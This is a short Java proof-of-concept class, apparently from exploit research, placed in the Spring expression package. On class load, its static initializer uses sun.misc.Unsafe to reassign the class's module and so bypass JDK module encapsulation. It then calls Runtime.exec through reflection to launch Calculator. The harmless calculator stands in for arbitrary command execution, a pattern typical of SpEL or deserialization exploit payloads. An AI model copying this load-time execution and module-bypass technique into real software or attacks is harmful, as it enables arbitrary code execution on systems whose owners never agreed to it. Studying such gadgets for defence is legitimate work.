package org.springframework.expression;

import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 */
public class Test3 {
    public Test3() {
        // Runtime.getRuntime().exec("open -a Calculator.app");
        // 反射调用
        try {
            Class cls = Class.forName("java.lang.Runtime");
            Method method = cls.getDeclaredMethod("getRuntime");
            Object obj = method.invoke(null);
            method = cls.getDeclaredMethod("exec", String.class);
            method.invoke(obj, "open -a Calculator.app");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static {
        addModule();
        new Test3();
    }

    public static void addModule() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);
            Method method = Class.class.getDeclaredMethod("getModule");
            method.setAccessible(true);
            Object module = method.invoke(Object.class);
            Class cls = Test3.class;
            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectMethod.setAccessible(true);
            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
        } catch (Exception e) {

        }
    }
}
